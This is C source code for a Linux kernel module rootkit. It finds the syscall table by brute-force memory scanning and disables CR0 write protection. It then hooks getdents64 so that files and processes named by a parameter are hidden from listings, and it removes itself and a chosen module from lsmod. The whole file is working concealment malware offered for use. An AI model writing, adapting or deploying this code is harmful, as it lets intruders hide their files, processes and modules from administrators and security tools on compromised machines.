#include <linux/module.h>
#include <linux/init.h>
#include <linux/miscdevice.h>
#include <linux/kernel.h>
#include <linux/unistd.h>
#include <asm/pgtable.h>
#include <linux/slab.h>
#include <linux/syscalls.h>
#include <linux/semaphore.h>
#include <linux/types.h>
#include <linux/dirent.h>
#include <linux/string.h>
#include <linux/mm.h>
#include <linux/stddef.h>
#include <linux/version.h>
#include <linux/in.h>
#include <linux/skbuff.h>
#include <linux/netdevice.h>
#include <asm/processor.h>
#include <asm/uaccess.h>
#include <asm/unistd.h>

unsigned long cr0;
static unsigned long *sys_call_table;

asmlinkage int (*original_getdents64) (unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);

#define START_MEM PAGE_OFFSET
#define END_MEM ULONG_MAX

static char *tohide = "default";
module_param(tohide, charp, 0644);
MODULE_PARM_DESC(tohide, "Name of the program/module to hide");

//brute force's through the memory looking for syscalltable. 
//This could be simply replaced by the output of 
//sudo cat /boot/System.map-$(uname -r) | grep sys_call_table 
//if the table position will not change
unsigned long * get_syscall_table_bf(void) {
    unsigned long *syscall_table;
    unsigned long int i;

    for (i = START_MEM; i < END_MEM; i += sizeof(void *)) {
        syscall_table = (unsigned long *)i;

        if (syscall_table[__NR_close] == (unsigned long)sys_close)
            return syscall_table;
    }
    return NULL;
}

asmlinkage int sys_getdents64_hook(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count){
    struct linux_dirent64 *item, *itemO;
    long ret, cnt;
    unsigned long hpid, nwarm;
    int move_pointer, hide_process;

    //original value 
    ret = (*original_getdents64) (fd, dirp, count);

    //if function returns 0 info, just return it
    if (!ret)
        return(ret);

    //getting info from user space
    itemO = (struct linux_dirent64 *) kmalloc(ret, GFP_KERNEL);
    __copy_from_user(itemO, dirp, ret);

    item = itemO, cnt = ret;

    while (cnt > 0)
    {
        cnt -= item->d_reclen; //place count in next record

        move_pointer = 1;
        hide_process = 0; //flags to be used in case of proccess or file hiding
        
        hpid = 0;
        hpid = simple_strtoul(item->d_name, NULL, 10);//get pid of process requesting this syscall

        if (hpid != 0)
        {
            struct task_struct *htask = current;
           
            //looking for process via pid to hide based on program name
            do  {
                if(htask->pid == hpid)
                    break;
                else
                    htask = next_task(htask);

            } while (htask != current);

            if ((htask->pid == hpid) && (strstr(htask->comm, tohide) != NULL))
                hide_process = 1;
        }

        // if hiding by process name or lookig if its a file to hide
        if ((hide_process) || (strstr(item->d_name, tohide) != NULL))
        {
            ret -= item->d_reclen; //remove this from return value

            move_pointer = 0;//pointer stays still, we are moving the data

            if (cnt) // count == 0 means its the last item on the list, so we do not need to move any data
                memmove(item, (char *) item + item->d_reclen, cnt);
        }

        if ((cnt) && (move_pointer))
            item = (struct linux_dirent64 *) ((char *) item + item->d_reclen);
    } 
    
    //send list back to user space
    nwarm = __copy_to_user((void *) dirp, (void *) itemO, ret);
    kfree(itemO);

    return(ret);
}


static inline void protect_memory(void){
    write_cr0(cr0);
}

static inline void unprotect_memory(void){
    write_cr0(cr0 & ~0x00010000);
}

static int __init start(void){
    struct module *mod = find_module(tohide);
   
    //hiding the rootkit from lsmod
    list_del(&THIS_MODULE->list);
    kobject_del(&THIS_MODULE->mkobj.kobj);
    list_del(&THIS_MODULE->mkobj.kobj.entry);

    //hiding a possible module from lsmod

    if (mod){
        list_del(&mod->list);
        kobject_del(&mod->mkobj.kobj);
        list_del(&mod->mkobj.kobj.entry);
    }

    //get sys call table
    sys_call_table = (unsigned long *)get_syscall_table_bf();

    if (!sys_call_table) {
        printk(KERN_INFO "sys_call_table not found\n");
        return -1;
    }
   
    //enable write to modify syscalltable
    cr0 = read_cr0();
    unprotect_memory();
  
    //swap tthe getdents64 with a modified version, but keep original to replace it back later
    original_getdents64 = (int (*)(unsigned int,  struct linux_dirent64 *, unsigned int))sys_call_table[__NR_getdents64];
    sys_call_table[__NR_getdents64] = (unsigned long)&sys_getdents64_hook;

    protect_memory();
    return 0;
}

static void __exit stop(void) {
    unprotect_memory();
       
    //if getdents64 was hooked, put the original back
    if (original_getdents64)
        sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;

    protect_memory();
}

module_init(start);
module_exit(stop);

MODULE_LICENSE("GPL");
